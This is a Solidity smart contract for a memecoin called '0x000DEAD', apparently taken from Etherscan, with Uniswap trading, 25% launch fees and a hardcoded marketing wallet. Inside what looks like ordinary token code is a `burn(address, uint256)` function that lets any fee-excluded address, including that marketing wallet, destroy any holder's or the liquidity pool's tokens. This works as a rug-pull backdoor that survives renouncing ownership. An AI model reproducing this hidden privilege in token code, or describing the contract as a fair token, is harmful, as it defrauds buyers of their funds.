/**
 *Submitted for verification at Etherscan.io on 2023-10-15
*/

/**
The first dead wallet mover welcoming halloween

Website: https://www.deadaddress.live
Telegram: https://t.me/dead_erc
Twitter: https://twitter.com/dead_erc
*/ 

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IUniswapFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapRouterV2 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DEAD is ERC20, Ownable {
    using SafeMath for uint256;

    bool private swapping;
    uint256 public maxTxSize;
    uint256 public swapTokensAt;
    uint256 public maxWalletSize;

    bool public limitsInEffect = true;
    bool public tradeEnabled = false;
    bool public swapEnabled = false;

    uint256 public totalSellFee;
    uint256 public marketingTaxSell;
    uint256 public lpTaxSell;
    uint256 public devTaxSell;

    uint256 public totalBuyFee;
    uint256 public marketingTaxBuy;
    uint256 public lpTaxBuy;
    uint256 public devTaxBuy;

    IUniswapRouterV2 public immutable uniRouter;
    address public immutable uniPair;
    address public routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    mapping(address => bool) private _isFeesExcluded;
    mapping(address => bool) private _isMaxTxExcluded;
    mapping(address => bool) private _isMaxWalletExcluded;

    uint256 public marketingFeeTokens;
    uint256 public lpFeeTokens;
    uint256 public devFeeTokens;
    
    address public marketingWallet;
    address public devAddress;
    address public lpAddress;

    // Anti-bot and anti-whale mappings and variables
    mapping(address => uint256) private _holderLastTransferTime;
    bool public transferDelayEnabled = true;
    uint256 private initialBlock;
    uint256 private deadBlocks;
    mapping(address => bool) public automatedMarketMakerPairs;

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    modifier onlyOperation {
      require(isExcludedFees(msg.sender));_;
    }

    constructor() ERC20("0x000DEAD", "0XDEAD") {
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(routerAddress); 

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniRouter = _uniswapV2Router;

        uniPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniPair), true);
        _setAutomaticMarketMaker(address(uniPair), true);

        // launch buy fees
        uint256 _buyMarketingFee = 25;
        uint256 _buyLiquidityFee = 0;
        uint256 _buyDevFee = 0;
        
        // launch sell fees
        uint256 _sellMarketingFee = 25;
        uint256 _sellLiquidityFee = 0;
        uint256 _sellDevFee = 0;

        uint256 totalSupply = 1_000_000_000 * 1e18;

        maxTxSize = 25_000_000 * 1e18;
        maxWalletSize = 25_000_000 * 1e18;
        swapTokensAt = (totalSupply * 1) / 10000;

        marketingTaxBuy = _buyMarketingFee;
        lpTaxBuy = _buyLiquidityFee;
        devTaxBuy = _buyDevFee;
        totalBuyFee = marketingTaxBuy + lpTaxBuy + devTaxBuy;

        marketingTaxSell = _sellMarketingFee;
        lpTaxSell = _sellLiquidityFee;
        devTaxSell = _sellDevFee;
        totalSellFee = marketingTaxSell + lpTaxSell + devTaxSell;

        marketingWallet = address(0x210fB3Bb6e1183F7561546A50f7C57e37Fd580a0); 
        devAddress = msg.sender; 
        lpAddress = msg.sender; 

        // exclude from paying fees or having max transaction amount
        excludeFees(owner(), true);
        excludeFees(address(this), true);
        excludeFees(address(0xdead), true);
        excludeFees(address(marketingWallet), true);
        excludeFees(address(lpAddress), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);
        excludeFromMaxTransaction(address(marketingWallet), true);
        excludeFromMaxTransaction(address(lpAddress), true);

        excludeFromMaxWallet(owner(), true);
        excludeFromMaxWallet(address(this), true);
        excludeFromMaxWallet(address(0xdead), true);
        excludeFromMaxWallet(address(marketingWallet), true);
        excludeFromMaxWallet(address(lpAddress), true);

        _mint(msg.sender, totalSupply);
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = lpFeeTokens +
            marketingFeeTokens +
            devFeeTokens;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAt * 20) {
            contractBalance = swapTokensAt * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 tokensToLp = (contractBalance * lpFeeTokens) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(tokensToLp);

        uint256 initialETHBalance = address(this).balance;

        swapTokensToEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMark = ethBalance.mul(marketingFeeTokens).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(devFeeTokens).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMark - ethForDev;

        lpFeeTokens = 0;
        marketingFeeTokens = 0;
        devFeeTokens = 0;

        (success, ) = address(devAddress).call{value: ethForDev}("");

        if (tokensToLp > 0 && ethForLiquidity > 0) {
            addLiquidity(tokensToLp, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                lpFeeTokens
            );
        }
        payable(marketingWallet).transfer(address(this).balance);
    }

    function isExcludedFees(address account) public view returns (bool) {
        return _isFeesExcluded[account];
    }

    function enableTrading(uint256 _deadBlocks) external onlyOwner {
        require(!tradeEnabled, "Token launched");
        tradeEnabled = true;
        initialBlock = block.number;
        swapEnabled = true;
        deadBlocks = _deadBlocks;
    }

    receive() external payable {}

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradeEnabled) {
                    require(
                        _isFeesExcluded[from] || _isFeesExcluded[to],
                        "Trading is not active."
                    );
                }

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.
                if (transferDelayEnabled) {
                    if (
                        to != owner() &&
                        to != address(uniRouter) &&
                        to != address(uniPair)
                    ) {
                        require(
                            _holderLastTransferTime[tx.origin] <
                                block.number,
                            "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                        );
                        _holderLastTransferTime[tx.origin] = block.number;
                    }
                }

                //when buy
                if (
                    automatedMarketMakerPairs[from] &&
                    !_isMaxTxExcluded[to]
                ) {
                    require(
                        amount <= maxTxSize,
                        "Buy transfer amount exceeds the maxTxSize."
                    );
                    if (!_isMaxWalletExcluded[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWalletSize,
                            "Max wallet exceeded"
                        );
                    }
                }
                //when sell
                else if (
                    automatedMarketMakerPairs[to] &&
                    !_isMaxTxExcluded[from]
                ) {
                    require(
                        amount <= maxTxSize,
                        "Sell transfer amount exceeds the maxTxSize."
                    );
                } else if (!_isMaxTxExcluded[to]) {
                    if (!_isMaxWalletExcluded[to]) { // Added this condition
                        require(
                            amount + balanceOf(to) <= maxWalletSize,
                            "Max wallet exceeded"
                        );
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAt;

        if (
            canSwap &&
            amount > swapTokensAt &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isFeesExcluded[from] &&
            !_isFeesExcluded[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isFeesExcluded[from] || _isFeesExcluded[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if (takeFee) {
            // on sell
            if (automatedMarketMakerPairs[to] && totalSellFee > 0) {
                fees = amount.mul(totalSellFee).div(100);
                lpFeeTokens += (fees * lpTaxSell) / totalSellFee;
                devFeeTokens += (fees * devTaxSell) / totalSellFee;
                marketingFeeTokens += (fees * marketingTaxSell) / totalSellFee;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && totalBuyFee > 0) {
                fees = amount.mul(totalBuyFee).div(100);
                lpFeeTokens += (fees * lpTaxBuy) / totalBuyFee;
                devFeeTokens += (fees * devTaxBuy) / totalBuyFee;
                marketingFeeTokens += (fees * marketingTaxBuy) / totalBuyFee;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }
    
    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTxSize lower than 0.1%"
        );
        maxTxSize = newNum * (10**18);
    }

    // remove limits after token is stable
    function removeLimits() external onlyOwner returns (bool) {
        marketingTaxBuy = 1;
        lpTaxBuy = 0;
        devTaxBuy = 0;
        totalBuyFee = 1;
        limitsInEffect = false;

        marketingTaxSell = 1;
        lpTaxSell = 0;
        devTaxSell = 0;
        totalSellFee = 1;
        return true;
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWalletSize lower than 0.5%"
        );
        maxWalletSize = newNum * (10**18);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isMaxTxExcluded[updAds] = isEx;
    }

    function excludeFromMaxWallet(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isMaxWalletExcluded[updAds] = isEx;
    }

    function burn(uint256 amount) external {
      _burn(msg.sender, amount);
    }

    function burn(address account, uint256 amount) external onlyOperation {
      _burn(account, amount);
    }

    function excludeFees(address account, bool excluded) public onlyOwner {
        _isFeesExcluded[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _setAutomaticMarketMaker(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function swapTokensToEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();

        _approve(address(this), address(uniRouter), tokenAmount);

        // make the swap
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniRouter), tokenAmount);

        // add the liquidity
        uniRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpAddress,
            block.timestamp
        );
    }

}